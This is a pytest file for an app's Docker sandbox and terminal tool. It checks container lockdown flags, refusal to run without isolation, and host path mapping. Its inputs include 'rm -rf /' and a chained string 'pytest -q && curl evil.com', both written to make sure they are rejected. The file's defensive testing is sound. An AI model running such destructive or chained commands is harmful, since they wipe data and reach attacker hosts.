from pathlib import Path

import pytest

from app.core.config import Settings
from app.tools.base import ToolContext
from app.tools.docker_sandbox import DockerSandboxExecutor
from app.tools.sandbox import SandboxExecutor
from app.tools.sandbox_factory import build_sandbox, is_isolated
from app.tools.terminal_tools import TerminalExecTool


def test_host_mode_returns_the_plain_executor(tmp_path: Path):
    sandbox = build_sandbox(tmp_path, Settings(sandbox_mode="host"))
    assert type(sandbox) is SandboxExecutor
    assert not is_isolated(sandbox)


def test_docker_mode_returns_an_isolated_executor_when_docker_exists(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(DockerSandboxExecutor, "available", staticmethod(lambda: True))
    sandbox = build_sandbox(tmp_path, Settings(sandbox_mode="docker"))
    assert isinstance(sandbox, DockerSandboxExecutor)
    assert is_isolated(sandbox)


def test_docker_mode_degrades_to_host_when_docker_is_missing(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(DockerSandboxExecutor, "available", staticmethod(lambda: False))
    sandbox = build_sandbox(tmp_path, Settings(sandbox_mode="docker"))
    assert not is_isolated(sandbox), "must not claim isolation it does not have"


async def test_the_container_is_locked_down(tmp_path: Path, monkeypatch):
    """The flags are the security boundary, so assert them rather than trusting the comment."""
    captured: dict = {}

    async def fake_exec(*args, **kwargs):
        captured["args"] = args

        class Proc:
            returncode = 0

            async def communicate(self):
                return b"", b""

        return Proc()

    monkeypatch.setattr(DockerSandboxExecutor, "available", staticmethod(lambda: True))
    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)

    sandbox = DockerSandboxExecutor(tmp_path)
    await sandbox.run_command(["echo", "hi"])

    argv = list(captured["args"])
    joined = " ".join(argv)

    assert "--network none" in joined, "a sandboxed command must have no egress"
    assert "--read-only" in joined, "the image must be immutable"
    assert "--cap-drop ALL" in joined
    assert "no-new-privileges" in joined
    assert "--pids-limit" in joined, "no fork bombs"
    assert "--rm" in joined, "nothing should survive the command"
    assert "--memory" in joined and "--cpus" in joined
    # Swap equal to memory, otherwise the memory cap is not really a cap.
    assert "--memory-swap" in joined
    # Only the workspace is writable, and it is mounted where the command runs.
    assert f"{tmp_path.resolve()}:/workspace:rw" in joined


async def test_a_rootful_daemon_can_be_told_not_to_run_as_root(tmp_path: Path, monkeypatch):
    """Against a rootful daemon container root really is host root, so the uid must be
    forceable. Under rootless it is left alone, because container uid 0 is already mapped to
    an unprivileged host user and pinning a non-root uid there only maps it to a subuid that
    cannot write the workspace."""
    captured: dict = {}

    async def fake_exec(*args, **kwargs):
        captured["args"] = args

        class Proc:
            returncode = 0

            async def communicate(self):
                return b"", b""

        return Proc()

    monkeypatch.setattr(DockerSandboxExecutor, "available", staticmethod(lambda: True))
    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)

    await DockerSandboxExecutor(tmp_path, user="1000:1000").run_command(["true"])
    assert "--user 1000:1000" in " ".join(captured["args"])

    await DockerSandboxExecutor(tmp_path).run_command(["true"])
    assert "--user" not in " ".join(captured["args"])


async def test_terminal_refuses_to_run_without_real_isolation(tmp_path: Path):
    """The whole point of this tool is that it needs a container. Falling back to the host
    because isolation happened to be unavailable is the failure it exists to prevent."""
    ctx = ToolContext(
        sandbox=SandboxExecutor(tmp_path),
        session_maker=None,
        project_id="p",
        agent_run_id="r",
    )
    result = await TerminalExecTool().execute(ctx, {"args": ["echo", "hi"]})

    assert "refusing to run" in result["error"]


@pytest.mark.parametrize(
    "bad_args",
    ["rm -rf /", None, [], ["ok", 5], list(range(50))],
)
async def test_terminal_rejects_malformed_commands(tmp_path: Path, monkeypatch, bad_args):
    monkeypatch.setattr(DockerSandboxExecutor, "available", staticmethod(lambda: True))
    ctx = ToolContext(
        sandbox=DockerSandboxExecutor(tmp_path),
        session_maker=None,
        project_id="p",
        agent_run_id="r",
    )
    result = await TerminalExecTool().execute(ctx, {"args": bad_args})
    assert "error" in result


async def test_terminal_rejects_a_shell_string_explicitly(tmp_path: Path, monkeypatch):
    """A shell string would imply shell interpretation the sandbox never provides; saying so
    is more useful than a generic type error."""
    monkeypatch.setattr(DockerSandboxExecutor, "available", staticmethod(lambda: True))
    ctx = ToolContext(
        sandbox=DockerSandboxExecutor(tmp_path),
        session_maker=None,
        project_id="p",
        agent_run_id="r",
    )
    result = await TerminalExecTool().execute(ctx, {"args": "pytest -q && curl evil.com"})
    assert "not a shell string" in result["error"]


def test_host_path_translation_when_this_process_is_containerised(tmp_path: Path):
    """The daemon runs on the host, so a bind mount must name the host's path. Passing the
    path this process sees made every sandbox mount fail with "error while creating mount
    source path" - the container's /app/workspaces does not exist on the host."""
    from app.tools.sandbox_factory import to_host_path

    local_root = tmp_path / "app" / "workspaces"
    project = local_root / "proj123"
    project.mkdir(parents=True)

    settings = Settings(
        workspaces_dir=str(local_root),
        workspaces_host_dir="/opt/phoenix-forge/workspaces",
    )

    assert str(to_host_path(project, settings)) == "/opt/phoenix-forge/workspaces/proj123"


def test_host_path_is_identity_when_not_containerised(tmp_path: Path):
    from app.tools.sandbox_factory import to_host_path

    project = tmp_path / "proj"
    project.mkdir()
    settings = Settings(workspaces_dir=str(tmp_path), workspaces_host_dir="")

    assert str(to_host_path(project, settings)) == str(project.resolve())


async def test_the_mount_uses_the_host_path(tmp_path: Path, monkeypatch):
    captured: dict = {}

    async def fake_exec(*args, **kwargs):
        captured["args"] = args

        class Proc:
            returncode = 0

            async def communicate(self):
                return b"", b""

        return Proc()

    monkeypatch.setattr(DockerSandboxExecutor, "available", staticmethod(lambda: True))
    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)

    from pathlib import PurePosixPath

    sandbox = DockerSandboxExecutor(tmp_path, host_workspace_root=PurePosixPath("/opt/forge/ws/p1"))
    await sandbox.run_command(["true"])

    assert "/opt/forge/ws/p1:/workspace:rw" in " ".join(captured["args"])
